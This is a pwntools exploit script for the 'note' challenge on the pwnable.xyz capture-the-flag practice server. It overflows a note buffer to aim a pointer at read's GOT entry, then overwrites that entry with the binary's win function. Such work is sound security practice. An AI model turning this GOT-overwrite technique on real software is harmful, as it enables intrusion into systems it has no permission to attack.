from pwn import *

# context.log_level = 'debug'


def edit_note(len, contents) :
	p.sendline("1")

	p.recvuntil("Note len? ")
	p.sendline(str(len))

	p.recvuntil("note: ")
	p.sendline(contents)


def edit_desc(contents) :
	p.sendline("2")

	p.recvuntil("desc: ")
	p.sendline(contents)





p = remote("svc.pwnable.xyz", 30016)
e = ELF("./note")

win_addr = e.symbols['win']
read_got = e.got['read']


print("\n[*] Exploit Informations")
print("    win_addr : " + hex(win_addr))
print("    read_got : " + hex(read_got))




# STEP1. Locate read_got in buf

print("\n[1] Locate read_got in buf")
print("    data : " + "A"*32 + p64(read_got))
p.recvuntil("> ")

edit_note(50, "A"*32 + p64(read_got))




# STEP2. Overwrite GOT's TABLE

print("\n[2] Overwrite GOT's TABLE")
print("    data : " + p64(win_addr))
p.recvuntil("> ")

edit_desc(p64(win_addr))


print("\n")

p.interactive()


